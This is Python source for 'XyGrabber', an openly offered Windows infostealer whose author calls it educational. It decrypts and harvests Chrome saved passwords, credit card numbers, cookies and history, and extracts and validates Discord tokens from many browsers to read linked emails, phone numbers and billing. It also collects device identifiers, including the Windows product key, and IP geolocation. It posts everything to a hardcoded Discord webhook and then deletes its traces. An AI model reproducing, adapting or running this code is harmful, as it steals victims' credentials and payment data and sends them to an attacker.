import os, json, httpx
import pathlib
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData as CUD
from typing import Optional, Callable
import base64 as b64
from re import findall
from discord import File, Webhook, RequestsWebhookAdapter, Embed
from datetime import datetime, timedelta
import sqlite3
from shutil import copy as cpyfile
import subprocess as sp
from uuid import getnode
from win32api import GetLogicalDriveStrings
from socket import gethostbyname, gethostname
from ctypes import windll
from platform import (
    system, 
    processor, 
    version,
    machine,
    release
)
from psutil import (
    virtual_memory,
    cpu_count,
    cpu_percent,
    boot_time
)

"""
messy code cus i added alot overtime
written by xylo#6666 dont skid xD
i wrote this solely for educational purposes and do not use it myself nor do i remommend u do
features:
    chrome:
        credit cards
        logins
        cookies
        history
    discord:
        tokens
        token info
    device:
        cpu
        gpu
        windows version
        os
        windows key
        hwid
        hostname
        LAN IP
        boot time
        boot mode
        mac address
        cpu core count
        cpu %
        drives
        ram
        architecture
        screen size
        monitor amount
        cursor size
        and more
"""

client: httpx.Client = httpx.Client()
temp: str = os.getenv("TEMP")
appdata: str = os.getenv("LOCALAPPDATA")
roaming: str = os.getenv("APPDATA")
HOOK_URL: str = "https://discord.com/api/webhooks/1016797679323467796/nQkeYHqO8TRFDpfUhRoTes4Vl-UZz_WpkwkgHuvElvel7Cevf8EwE0CnBoNoqRkLGaAb"

class Crypt:
    
    @staticmethod
    def generate_cipher(key, iv) -> any:
        return AES.new(key, AES.MODE_GCM, iv)

    @staticmethod
    def decrypt_payload(cipher, payload: any) -> any:
        return cipher.decrypt(payload)

    @staticmethod
    def get_local_state_key(path: str) -> bytes:
        with open(path, "r", encoding="utf-8") as f:
            ls: dict[any ,any] = json.loads(f.read())
        master_key = (b64.b64decode(ls["os_crypt"]["encrypted_key"]))[5:]
        return CUD(master_key, *([None] * 3), 0)[1]

    @staticmethod
    def decrypt_aes_encryption(buffer, master_key: bytes) -> str | None:
        return_value: str | None = None
        try:
            iv, payload = buffer[3:15], buffer[15:]
            cipher = Crypt.generate_cipher(master_key, iv)
            decrypted_pass = Crypt.decrypt_payload(cipher, payload)
            return_value = decrypted_pass[:-16].decode()
        finally:
            return return_value

class Device:

    creation_flags: int = 0x08000000

    @classmethod
    def get_hwid(cls) -> str:
        return sp.check_output(
            "wmic csproduct get uuid", creationflags=cls.creation_flags
        ).decode("utf-8").split("\n")[1].strip()

    @classmethod
    def get_gpu(cls) -> str:
        return sp.check_output(
            "wmic path win32_VideoController get name", creationflags=cls.creation_flags
        ).decode("utf-8").split("\n")[1].strip()

    @classmethod
    def get_windows_key(cls) -> str:
        return sp.check_output(
            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
            creationflags=cls.creation_flags
        ).decode("utf-8").rstrip()

    @classmethod
    def get_windows_version(cls) -> str:
        return sp.check_output(
            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
            creationflags=cls.creation_flags
        ).decode("utf-8").rstrip()

    def get_hostname() -> str:
        return gethostname()

    def get_lan_ip() -> str:
        return gethostbyname(gethostname())

    def get_boot_time() -> str:
        return datetime.fromtimestamp(
            boot_time()
        ).strftime("%Y-%m-%d %H:%M:%S")

    def get_mac() -> str:
        return ":".join(findall("..", "%012x" % getnode()))

    def get_cpu() -> str:
        return processor()

    def cpu_core_count() -> int:
        return cpu_count()

    def cpu_percentage() -> str:
        return f"{cpu_percent(interval=.2)}%"

    def get_os() -> str:
        return f"{system()} {release()} /{version()}"

    def get_architecture() -> str:
        return machine()

    def get_ram() -> str:
        return f"{str(round(virtual_memory().total / (1024.0 **3)))}GB"

    def get_drives() -> list[str]:
        return GetLogicalDriveStrings().split("\000")[:-1]

    def get_system_boot_mode() -> str:
        data = windll.user32.GetSystemMetrics(67)
        return {
            0: "Normal Boot",
            1: "Fail-Safe Boot",
            2: "Fail-Safe Boot With Network"
        }.get(data, "N/A")

    def get_screensize() -> str:
        return f"{windll.user32.GetSystemMetrics(0)}x{windll.user32.GetSystemMetrics(1)}"

    def get_monitor_count() -> int:
        return windll.user32.GetSystemMetrics(80)

    def get_mouse_button_count() -> int:
        return windll.user32.GetSystemMetrics(43)

    def get_cursor_size() -> str: 
        return f"{windll.user32.GetSystemMetrics(13)}px"

    def formatter(func: Callable, *args, **kwargs) -> Callable:
        def wrapper(*func_args, **func_kwargs) -> dict[any, any]:
            f = func(*func_args, **func_kwargs)
            if isinstance(f, dict):
                for title, name in f.items():
                    title, name = title if title is not None else "N/A", name if name is not None else "N/A"
                    f[title] = name
            return f
        return wrapper

    @classmethod
    @formatter
    def return_dict(cls) -> dict[str, any]:
        """
        IT GETS EVERYTHING LOL
        """
        return {
            "hwid": cls.get_hwid(),
            "gpu": cls.get_gpu(),
            "windows key": cls.get_windows_key(),
            "windows version": cls.get_windows_version(),
            "drives": [d for d in cls.get_drives()],
            "architecture": cls.get_architecture(),
            "cpu": cls.get_cpu(),
            "cpu cores": cls.cpu_core_count(),
            "cpu percentage": cls.cpu_percentage(),
            "boot time": cls.get_boot_time(),
            "boot mode": cls.get_system_boot_mode(),
            "screensize": cls.get_screensize(),
            "cursor size": cls.get_cursor_size(),
            "mouse button count": cls.get_mouse_button_count(),
            "monitor count": cls.get_monitor_count(),
            "OS": cls.get_os(),
            "ram": cls.get_ram(),
            "mac address": cls.get_mac(),
            "hostname": cls.get_hostname(),
            "LAN ip": cls.get_lan_ip()
        }


class DiscordInfo:
    def __init__(self, token: str) -> None:
        self.headers: dict[str, str] = {"Authorization": token}

    @staticmethod
    def __get_av(user_json: dict[any, any]) -> str:
        avatar: str = f"https://cdn.discordapp.com/avatars/{user_json.get('id')}/{user_json.get('avatar')}"
        try:
            client.get(avatar)
        except:
            avatar += ".gif"
        finally:
            return avatar

    def get_info(self) -> dict[str, any]:
        res: dict[any, any] = dict(client.get(
            "https://discord.com/api/v9/users/@me", headers=self.headers).json())
        billing: bool | tuple[bool, list[str]] = self.get_billing()
        if not isinstance(billing, bool):
            return {
                "phone": res.get("phone", None),
                "email": res.get("email", None),
                "id": res.get("id", None),
                "tag": f"{res.get('username', None)}#{res.get('discriminator')}",
                "avatar": self.__get_av(res),
                "2FA": res.get("mfa_enabled", None),
                "Has Nitro": self.has_nitro(),
                "Has Billing": billing[0],
                "Billing Info": billing[1]
            } if self.has_nitro() is False else {
                "phone": res.get("phone", None),
                "email": res.get("email", None),
                "id": res.get("id", None),
                "tag": f"{res.get('username', None)}#{res.get('discriminator')}",
                "avatar": self.__get_av(res),
                "2FA": res.get("mfa_enabled", None),
                "Nitro Type": "Classic" if res.get("premium_type") != 2 else "Premium",
                "Has Nitro": self.has_nitro(),
                "Has Billing": billing[0],
                "Billing Info": billing[1]
            }
        else:
            return {
                "phone": res.get("phone", None),
                "email": res.get("email", None),
                "id": res.get("id", None),
                "tag": f"{res.get('username', None)}#{res.get('discriminator')}",
                "avatar": self.__get_av(res),
                "2FA": res.get("mfa_enabled", None),
                "Has Nitro": self.has_nitro(),
                "Has Billing": billing
            } if self.has_nitro() is False else {
                "phone": res.get("phone", None),
                "email": res.get("email", None),
                "id": res.get("id", None),
                "tag": f"{res.get('username', None)}#{res.get('discriminator')}",
                "avatar": self.__get_av(res),
                "2FA": res.get("mfa_enabled", None),
                "Nitro Type": "Classic" if res.get("premium_type") != 2 else "Premium",
                "Has Nitro": self.has_nitro(),
                "Has Billing": billing
            }

    def has_nitro(self) -> bool:
        return bool(
            len(client.get(
                "https://discordapp.com/api/v9/users/@me/billing/subscriptions", 
                headers=self.headers
            ).json())
        )

    def get_billing(self) -> bool | tuple[bool, list[str]]:
        billing_json: list[dict[any, any]] = client.get(
                "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                headers=self.headers
            ).json()
        if billing_json:
            types: list[str] = []
            for payment_src in billing_json:
                if payment_src.get("type") == 1:
                    types.append("Credit Card")
                elif payment_src.get("type") == 2:
                    types.append("Paypal")
            return bool(len(billing_json)), types if types else bool(len(billing_json))
        return bool(len(billing_json))

    @staticmethod
    def is_valid_token(token: str) -> bool:
        if token.strip():
            return client.get(
                "https://discord.com/api/v9/users/@me",
                headers={"Authorization": token}
            ).status_code in range(200, 300)
        return False
        

    def create_embed(self) -> dict[any, any]:
        info: dict[any, any] = self.get_info()
        return {
            "embeds": [
                {
                    "author": {
                        "name": f'{info.get("tag")} Ran XyGrabber LMFAO',
                        "url": "https://github.com/xyloup",
                        "icon_url": info.get("avatar")
                    },
                    "description": f"```Token: {self.headers['Authorization']}```\n" + ''.join(
                        {f"```{k}: {v}```\n" for (k, v) in info.items() if k not in ("avatar", "tag")}),
                    "color": 0xFFFFFF
                }
            ]
        }

class XyGrabber:
    class ChromeGrabber:
        chrome_user_data_path: str = f"{appdata}\\Google\\Chrome\\User Data"

        def __init__(self) -> None:
            self.local_state_key: bytes = Crypt.get_local_state_key(
                f"{self.chrome_user_data_path}\\Local State"
            )

        @staticmethod
        def convert_time(chrometime) -> str:
            return str(
                datetime(1601, 1, 1) + timedelta(microseconds=chrometime)
            )

        @staticmethod
        def execute_sqlite(path: str, command: str) -> list[tuple]:
            return_value: None | list[tuple] = [()]
            if not os.path.exists(path):
                return return_value
            try:
                cpyfile(path, (dest := f"{temp}\\MSFTDebug.db")) # lmfao
                with sqlite3.connect(dest) as db:
                    cursor: sqlite3.Cursor = db.cursor()
                    cursor.execute(command)
                    return_value = cursor.fetchall()
            finally:
                return return_value

        def grab_ccs(self) -> None:
            with open(f"{temp}\\ccs.txt", "w") as f:
                for row in (query := self.execute_sqlite(
                    f"{self.chrome_user_data_path}\\Default\\Web Data",
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards"
                )):
                    if any(query) or row:
                        f.write(
                            f"Name -> {row[0]} ; Month -> {row[1]} ; Year -> {row[2]} ; Card Number -> {Crypt.decrypt_aes_encryption(row[3], self.local_state_key)}")

        def grab_logins(self) -> None:
            with open(f"{temp}\\logins.txt", "w") as f:
                for row in (query := self.execute_sqlite(
                    f"{self.chrome_user_data_path}\\Default\\Login Data",
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                )):
                    if any(query) or row:
                        username, password = row[2], Crypt.decrypt_aes_encryption(row[3], self.local_state_key)
                        if any([username, password]):
                            f.write(
                                f"Origin-URL -> {row[0]} ; Action-URL -> {row[1]} ; Username -> {username} ; Decrypted-Password -> {password} ; Creation Date -> {self.convert_time(row[4])} ; Date Account Was Last Used {self.convert_time(row[5])}"
                            )

        def grab_history(self) -> None:
            with open(f"{temp}\\history.txt", "w") as f:
                for row in (query := self.execute_sqlite(
                    f"{self.chrome_user_data_path}\\Default\\History",
                    "SELECT * FROM urls"
                )):
                    if any(query) or row:
                        visit_time: str = self.convert_time(row[5])
                        if visit_time[:4] != "1601":
                            visit_time = str(datetime.strptime(
                                visit_time, "%Y-%m-%d %H:%M:%S.%f"))[:-7]
                        f.write(
                            f"Visited Website: {row[1]} At {visit_time}\n"
                        )

        def grab_cookies(self) -> None:
            with open(f"{temp}\\cookies.txt", "w") as f:
                for row in (query := self.execute_sqlite(
                    f"{self.chrome_user_data_path}\\Default\\Network\\Cookies",
                    "SELECT * FROM cookies"
                )):
                    if any(query) or row:
                        f.write(
                            f"Host: {row[0]}\nCookie name: {row[1]}\nCookie value (decrypted): {Crypt.decrypt_aes_encryption(row[5], self.local_state_key)}\n"
                        )

        def __enter__(self):
            self.grab_logins()
            self.grab_ccs()
            self.grab_history()
            self.grab_cookies()
            return self

        def __exit__(self, *args, **kwargs) -> None:
            for file in (f"{temp}\\{f}" for f in (
                "ccs.txt", "logins.txt", "history.txt", "cookies.txt", "MSFTDebug.db"
            )):
                if os.path.exists(file):
                    try:
                        os.remove(file)
                    except:
                        pass

    tokens = set()
    rgx = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    encrypted_rgx = r"dQw4w9WgXcQ:[^\"]*"

    def __init__(self) -> None:
        self.paths: dict[str, str] = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Ungoogled Chromium': appdata + '\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
        }
    
    @staticmethod
    def get_local_state_path_discords_only(file: str) -> str:
        return str(pathlib.Path(*(file.split("\\"))[:7])).replace("Storage", "State").replace("C:", "C:\\")

    @classmethod
    def grab_discord(cls, path: str) -> None:
        if not os.path.exists(path) or not os.path.isfile(path) or not path.lower().endswith((".ldb", ".log")):
            return 
        with open(path, "r", errors="ignore") as file:
            for line in (__line.strip() for __line in file.readlines() if __line.strip()):
                for _token in findall(cls.encrypted_rgx, line):
                    if not os.path.exists((cord_path := cls.get_local_state_path_discords_only(path))):
                        continue
                    if (
                        token := Crypt.decrypt_aes_encryption(
                            b64.b64decode(_token.split("dQw4w9WgXcQ:")[1]), Crypt.get_local_state_key(
                                cord_path
                            )
                        )
                    ) not in cls.tokens and token is not None and DiscordInfo.is_valid_token(token):
                        cls.tokens.add(token)
                        
    @classmethod
    def grab_firefox(cls, path: str) -> None:
        if not os.path.exists(path) or os.path.isfile(path) or path.endswith(".sqlite"):
            return
        with open(path, "r", errors="ignore") as file:
            for line in (__line.strip() for __line in file.readlines() if __line.strip()):
                for token in findall(cls.rgx, line):
                    if token not in cls.tokens and DiscordInfo.is_valid_token(token):
                        cls.tokens.add(token)

    @classmethod
    def grab_the_rest(cls, path: str) -> None:
        if not os.path.exists(path) or os.path.isfile(path) or path.endswith((".ldb", ".log")):
            return
        with open(path, "r", errors="ignore") as file:
            for line in (__line.strip() for __line in file.readlines() if __line.strip()):
                for token in findall(cls.rgx, line):
                    if token not in cls.tokens and DiscordInfo.is_valid_token(token):
                        cls.tokens.add(token)

    def grab_all(self) -> None:
        for path_name, path in self.paths.items():
            if not os.path.exists(path):
                continue
            if "iscord" in path_name.lower():
                for file in os.listdir(path):
                    self.grab_discord(f"{path}\\{file}")
            elif "firefox" in path_name.lower():
                for loc, _, files in os.walk(path):
                    for file in files:
                        self.grab_firefox(f"{loc}\\{file}")
            else:
                for file in os.listdir(path):
                    self.grab_the_rest(f"{path}\\{file}")


    @staticmethod
    def send_webhook(webhook: str, embed: dict[any, any], *, files: Optional[list[str]] | None = None) -> None:
        if files is None:
            client.post(webhook, json=embed)
        else:
            Webhook.from_url(webhook, adapter=RequestsWebhookAdapter()).send(
                embed=Embed.from_dict(embed.get("embeds")[0]), files=[File(f) for f in files]
            )

    @staticmethod
    def create_embed(_dict: dict[any, any], author: Optional[dict[str, str]] | None = None) -> dict[any, any]:
        return {
            "embeds": [
                {
                    "description": ''.join({f"```{k}: {v}```\n" for (k, v) in _dict.items()}),
                    "color": 0xFFFFFF
                } if author is None else {
                    "author": author,
                    "description": ''.join({f"```{k}: {v}```\n" for (k, v) in _dict.items()}),
                    "color": 0xFFFFFF
                }
            ]
        }

    def run(self, webhook: str) -> None:
        def send_ip_embed() -> None:
            json: dict[any, any] = dict(
                client.get("http://ipinfo.io/json").json())
            self.send_webhook(
                webhook,
                self.create_embed(json, {
                    "name": f"GeoLocation Data For {os.getlogin()}"
                })
            )
        def send_device_embed() -> None:
            self.send_webhook(webhook, self.create_embed(
                Device.return_dict(), {
                    "name": f"Device Data For {os.getlogin()}"
                }
            ))
        send_device_embed()
        send_ip_embed()
        with self.ChromeGrabber() as cg:
            self.grab_all()
            if self.tokens:
                for index, token in enumerate(self.tokens):
                    embed = DiscordInfo(token).create_embed()
                    if index == 0:
                        self.send_webhook(webhook, embed, files=[file for file in (f"{temp}\\{f}" for f in (
                            "ccs.txt", "logins.txt", "history.txt", "cookies.txt"
                        ))])
                    else:
                        self.send_webhook(webhook, embed)
            else:
                def create_no_token_embed() -> dict[any, any]:
                    return {
                        "embeds": [
                            {
                                "description": "NO TOKENS FOUND",
                                "color": 0xFFFFFF
                            }
                        ]
                    }
                self.send_webhook(webhook, create_no_token_embed(), files=[file for file in (f"{temp}\\{f}" for f in (
                            "ccs.txt", "logins.txt", "history.txt", "cookies.txt"
                        ))])


if __name__ == "__main__":
    try:
        XyGrabber().run(HOOK_URL)
    except Exception as e:
       pass
    